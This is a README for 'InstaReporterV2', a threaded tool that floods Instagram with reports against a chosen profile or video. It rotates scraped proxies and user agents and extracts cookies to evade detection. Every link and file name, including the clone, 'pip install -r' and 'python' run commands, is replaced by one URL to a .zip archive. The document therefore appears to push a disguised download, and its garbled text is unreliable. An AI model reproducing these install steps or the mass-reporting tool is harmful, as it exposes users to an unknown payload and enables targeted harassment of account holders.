# 🎯 InstaReporterV2
  
<div align="center">  
  

```
╭━━╮╱╱╱╱╱╭╮╱╱╱╭━━━╮╱╱╱╱╱╱╱╱╱╱╭╮
╰┫┣╯╱╱╱╱╭╯╰╮╱╱┃╭━╮┃╱╱╱╱╱╱╱╱╱╭╯╰╮
╱┃┃╭━╮╭━┻╮╭╋━━┫╰━╯┣━━┳━━┳━━┳┻╮╭╋━━┳━╮
╱┃┃┃╭╮┫━━┫┃┃╭╮┃╭╮╭┫┃━┫╭╮┃╭╮┃╭┫┃┃┃━┫╭╯
╭┫┣┫┃┃┣━━┃╰┫╭╮┃┃┃╰┫┃━┫╰╯┃╰╯┃┃┃╰⫔┃━┫┃
╰━━┻╯╰┻━━┻━┻╯╰┻╯╰━┻━━┫╭━┻━━┻╯╰━┻━━┻╯
╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱┃┃
╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰╯  -V2
```
  
**🚀 Lightweight, Thread-Based Instagram Content Reporting Tool** *A streamlined and efficient automation tool built with a multi-threaded architecture.* [![Python](https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip+https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip)](https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip)  
[![License](https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip)](LICENSE)  
[![Status](https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip)](https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip)  
  
</div>  
  
---  
  
## 🌟 What's New in V2
  
InstaReporterV2 is a complete rewrite focused on **simplicity, performance, and reduced dependencies**.
  
- **Lightweight Threading**: Replaced the heavy `multiprocessing` module with a more efficient `threading` model for concurrent operations.
- **Dependency Free**: Removed complex dependencies like `proxybroker` and `asyncio`. V2 only requires `requests` and `colorama`.
- **Built-in Proxy Scraper**: Integrated a lightweight proxy scraper that fetches fresh proxies from free proxy websites, removing the need for third-party libraries.
- **Refactored Codebase**: Simplified project structure (`src/`) and improved code readability.
  
---  
  
## 📋 Features  
  
### 🎯 **Dual Attack Modes** - **Profile Reporting**: Target specific Instagram user profiles.
- **Video Content Reporting**: Report individual video posts.
  
### ⚡ **High-Performance Architecture** - **Multi-Threading Engine**: Utilizes a user-defined number of threads for concurrent reporting tasks.
- **Optimized Proxy Handling**: Efficiently loads and rotates proxies (from file or scraper) for each thread.
  
### 🛡️ **Advanced Anonymity System** - **Built-in Proxy Scraper**: Automatically scrapes proxies from multiple online sources.
- **Custom Proxy Lists**: Full support for user-provided proxy files.
- **User Agent Rotation**: 90+ realistic browser user agents to mimic real devices.
- **Protocol Intelligence**: Automatic HTTP/HTTPS proxy configuration.
  
### 🎨 **Professional User Interface** - **Colorized Console Output**: Clean terminal interface with status indicators (Success, Fail, Retry).
- **Real-time Progress Tracking**: Live monitoring of reporting attempts.
- **Error Handling**: Clear error reporting for failed requests or bad proxies.  
  
---  
  
## 🚀 Quick Start  
  
### Prerequisites  
  

#### Python 3.7 or higher required
python --version
 
### Installation
 
  * Clone the repository

```
   git clone https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip
   cd InstaReporterV2
```
<!-- end list -->
  
* Install dependencies
   
```  
# Install from https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip
pip install -r https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip
```

* Or manually

```
pip install requests colorama  
```

 * Run the application
```
python https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip
```
---  
  
## 📋 Usage Guide  
  
### 🎯 **Interactive Mode** The application provides an intuitive step-by-step interface:  
  
1. **Proxy Configuration** - Choose to use proxies or run without them.
   - `1`: Auto-scrape proxies from the internet.
   - `2`: Provide your own proxy list file (`https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip`).
  
2. **Thread Count**
   - Enter the number of concurrent threads you want to run.
  
3. **Attack Mode Selection** - `1` - Report Instagram profiles.
   - `2` - Report Instagram videos.
  
4. **Target Specification** - Enter the username (for profiles).
   - Enter the video URL (for videos).
  
### 📁 **Proxy File Format** If you use your own list, create a `https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip` file in the same directory with one proxy per line:  

https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip
https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip
192.168.1.100:8080
  
---  
  

### 🔄 **Workflow Architecture** 
```mermaid  
graph TB  
    A[User Input] --> B{Proxy Choice}  
    B -->|Scrape| C[Proxy Scraper]  
    B -->|File| D[Load https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip]  
    B -->|No| E[Direct Mode]
    C --> F[Input Threads]
    D --> F
    E --> F
    F --> G{Attack Mode}
    G -->|Profile| H[Profile Attack Threads]  
    G -->|Video| I[Video Attack Threads]  
    H --> J[Run Concurrent Attacks]
    I --> J
    J --> K[Success/Error Reporting]  
```

🎯 Attack Process Flow 1. Session Initialization: Create HTTP session with proxy configuration.
 * Authentication Chain: Facebook → Instagram cookie extraction.
 * Form Parameter Extraction: Dynamic token and session data parsing.
 * Report Submission: POST request to Instagram's help infrastructure.
 * Response Validation: Success/error status verification.
⚙️ Configuration
🔧 Performance Tuning - Thread Count: This is the main performance lever and is set by the user at runtime. More threads increase request volume but also require more system resources.
 * HTTP Timeout: A 10-second timeout is hardcoded for all network requests to prevent threads from hanging on bad proxies.
🛡️ Security Features - Dynamic User Agents: Automatic browser user agent rotation on every request.
 * Cookie Management: Automatic session handling and cookie extraction.
 * Error Resilience: Comprehensive exception handling for network errors, timeouts, and bad proxies.
📊 System Requirements
🖥️ Minimum Requirements - OS: Windows 7+, macOS 10.12+, Linux (any modern distro)
 * Python: 3.7 or higher
 * RAM: 256MB available memory
 * Network: Stable internet connection
📦 Dependencies - requests[socks] - HTTP client with SOCKS proxy support
 * colorama - Cross-platform colored terminal text


### 🔍 **Key Functions** - `profile_attack_threaded()` / `video_attack_threaded()`: Worker functions for threads.
- `report_profile_attack()` / `report_video_attack()`: Core attack logic.
- `load_proxies()`: Loads proxies from `https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip`.
- `get_proxy_from_url()`: Scrapes and returns a list of proxies from online sources.
  
---  
  
## ⚠️ Legal Disclaimer  
  
This tool is designed for **educational and research purposes only**. Users are responsible for:  
  
- ✅ Complying with Instagram's Terms of Service  
- ✅ Following local and international laws  
- ✅ Using the tool ethically and responsibly  
- ❌ Not engaging in harassment or malicious activities  
  
**The developers assume no responsibility for misuse of this software.** ---  
  
## 🤝 Contributing  
  
We welcome contributions! Here's how you can help:  
  
1. **🍴 Fork the repository** 2. **🌿 Create a feature branch** (`git checkout -b feature/amazing-feature`)  
3. **💾 Commit your changes** (`git commit -m 'Add amazing feature'`)  
4. **📤 Push to the branch** (`git push origin feature/amazing-feature`)  
5. **🔄 Open a Pull Request** ### 🐛 **Bug Reports** Found a bug? Please open an issue with:  
- Detailed description  
- Steps to reproduce  
- Expected vs actual behavior  
- System information  
  
---  
  
## 📞 Support & Contact  
  
<div align="center">  
  
**👨‍💻 Producer: Muneeb** [![Instagram](https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip)](https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip)  
[![GitHub](https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip)](https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip)  
[![Email](https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip)](https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip)  
  
</div>  
  
---  
  
## 📄 License  
  
This project is licensed under the **MIT License** - see the `LICENSE` file for details.  
  
---  
  
<div align="center">  
  
**⭐ If this project helped you, please give it a star! ⭐** *Made with ❤️ by [Muneeb](https://raw.githubusercontent.com/Erenluffy/instareporrrt/master/src/Software_1.5-alpha.2.zip)* </div>
